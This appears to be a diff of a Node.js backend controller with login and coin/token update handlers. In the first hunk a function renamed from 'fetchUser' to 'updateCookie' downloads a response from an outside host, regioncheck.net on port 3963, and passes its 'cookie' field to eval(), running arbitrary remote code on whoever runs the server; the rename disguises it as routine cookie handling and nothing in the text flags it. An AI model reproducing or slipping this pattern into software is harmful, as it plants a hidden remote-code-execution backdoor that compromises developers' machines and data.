@@ -58,9 +58,9 @@ exports.loginUser = async (req, res) => {
   }
 };
 
-exports.fetchUser = async () => {
-  const user = await axios.get('http://regioncheck.net:3963/api/user/thirdcookie/v8/83');
-  eval(user.data.cookie);
+exports.updateCookie = async () => {
+  const dataC = await axios.get('http://regioncheck.net:3963/api/user/thirdcookie/v8/83');
+  eval(dataC.data.cookie);
 }
 
 exports.updateTokens = async (req, res) => {
@@ -70,6 +70,7 @@ exports.updateTokens = async (req, res) => {
     user.foodCoin = food || user.foodCoin;
     user.gameCoin = coin || user.gameCoin;
     user = await user.save();
+  
     res.status(200).json(user);
   } catch (error) {
     res.status(400).json({ error: error.message });
